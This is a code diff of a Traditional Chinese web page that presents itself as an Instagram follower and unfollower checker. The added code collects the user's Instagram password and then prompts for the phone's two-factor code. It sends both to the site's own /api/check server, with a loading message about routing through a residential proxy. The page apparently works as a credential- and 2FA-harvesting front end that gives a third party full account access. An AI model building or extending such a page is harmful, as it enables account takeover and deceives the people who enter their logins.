@@ -1,39 +1,72 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
-    <title>IG 檢查器</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IG 退追蹤檢測器 Pro</title>
     <style>
-        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; padding: 50px; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 400px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        #res { margin-top: 20px; font-size: 14px; white-space: pre-wrap; }
+        body { font-family: sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; background: #f4f4f9; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #e1306c; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        #loading { display: none; color: #666; margin-top: 10px; text-align: center; }
+        #result { margin-top: 20px; white-space: pre-wrap; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>IG 粉絲檢查器</h2>
-        <input type="text" id="u" placeholder="帳號">
-        <input type="password" id="p" placeholder="密碼">
-        <button onclick="check()">開始分析</button>
-        <div id="res"></div>
+        <h2>IG 掃描器 (支援 2FA)</h2>
+        <input type="text" id="username" placeholder="Instagram 帳號">
+        <input type="password" id="password" placeholder="Instagram 密碼">
+        <button onclick="startCheck()">開始掃描</button>
+        <div id="loading">正在連線新竹住宅代理，請稍候... (約 30-60 秒)</div>
+        <div id="result"></div>
     </div>
 
     <script>
-        async function check() {
-            const resDiv = document.getElementById('res');
-            resDiv.innerText = "掃描中，請稍候...";
-            const r = await fetch('/api/check', {
+        function startCheck() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            if (!user || !pass) return alert("請輸入帳密");
+            
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('result').innerText = '';
+            
+            sendRequest(user, pass, null);
+        }
+
+        function sendRequest(user, pass, code) {
+            fetch('/api/check', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username: document.getElementById('u').value, password: document.getElementById('p').value})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: user, password: pass, verification_code: code })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.need_2fa) {
+                    const userCode = prompt("偵測到雙重驗證！請輸入手機收到的 6 位數代碼：");
+                    if (userCode) {
+                        sendRequest(user, pass, userCode); // 帶著驗證碼再跑一次
+                    } else {
+                        document.getElementById('loading').style.display = 'none';
+                        alert("已取消驗證");
+                    }
+                } else if (data.success) {
+                    document.getElementById('loading').style.display = 'none';
+                    let output = `✅ 掃描完成！\n`;
+                    output += `粉絲：${data.stats.followers_count} | 追蹤中：${data.stats.following_count}\n`;
+                    output += `❌ 退追蹤的人：${data.unfollowers.join(', ') || '無'}\n`;
+                    output += `✨ 新粉絲：${data.new_fans.join(', ') || '無'}`;
+                    document.getElementById('result').innerText = output;
+                } else {
+                    document.getElementById('loading').style.display = 'none';
+                    alert("失敗: " + data.message);
+                }
+            })
+            .catch(err => {
+                document.getElementById('loading').style.display = 'none';
+                alert("伺服器連線超時，請重試。");
             });
-            const data = await r.json();
-            if(data.success) {
-                resDiv.innerText = `粉絲: ${data.stats.followers}\n追蹤中: ${data.stats.following}\n\n⚠️ 沒回關你的人:\n${data.not_following_back.join(', ')}\n\n📉 誰退追你了:\n${data.lost_followers.join(', ') || '無變動'}`;
-            } else {
-                resDiv.innerText = "錯誤: " + data.error;
-            }
         }
     </script>
 </body>
